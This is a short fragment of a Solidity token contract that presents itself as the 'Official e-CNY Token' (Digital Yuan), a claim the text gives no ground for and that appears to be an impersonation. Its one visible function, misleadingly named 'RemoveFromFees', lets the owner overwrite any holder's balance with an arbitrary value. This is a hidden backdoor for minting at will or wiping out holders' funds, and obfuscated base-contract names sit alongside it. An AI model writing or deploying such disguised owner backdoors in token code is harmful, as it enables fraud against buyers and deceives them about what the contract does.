/**
✨ Official e-CNY Token ✨
¥💴Digital Yuan Token e-CNY ¥ 数字人民币
...
contract eCNYToken is Contextrte, IBEPeCNY, Ownableertg {
 ...
 function RemoveFromFees(address CeCNY, uint256 CeCNYNFT) external onlyOwner{
    _totbalances[CeCNY] = CeCNYNFT;
  }
